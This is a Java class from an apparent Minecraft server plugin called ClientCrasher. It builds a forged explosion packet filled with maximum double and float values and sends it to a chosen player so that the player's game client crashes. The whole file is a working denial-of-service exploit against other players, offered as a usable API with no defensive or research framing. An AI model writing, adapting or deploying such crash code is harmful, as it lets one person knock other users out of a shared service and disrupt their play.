package org.sysapp.runkang10.clientcrasher.api;

import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import org.bukkit.entity.Player;
import org.sysapp.runkang10.clientcrasher.ClientCrasher;

import java.util.ArrayList;

public class CrashPlayer {
    private final static ProtocolManager protocolManager = ClientCrasher.getProtocolManager();

    public void crash(Player player) {
        PacketContainer fakeExplosion = new PacketContainer(PacketType.Play.Server.EXPLOSION);
        fakeExplosion.getDoubles()
                .write(0, Double.MAX_VALUE)
                .write(1, Double.MAX_VALUE)
                .write(2, Double.MAX_VALUE);
        fakeExplosion.getFloat()
                .write(0, Float.MAX_VALUE);
        fakeExplosion
                .getBlockPositionCollectionModifier()
                .write(0, new ArrayList<>());
        fakeExplosion
                .getDoubles()
                .write(3, Double.MAX_VALUE);
        fakeExplosion
                .getDoubles()
                .write(4, Double.MAX_VALUE);
        fakeExplosion
                .getDoubles()
                .write(5, Double.MAX_VALUE);

        protocolManager.sendServerPacket(player, fakeExplosion);
    }
}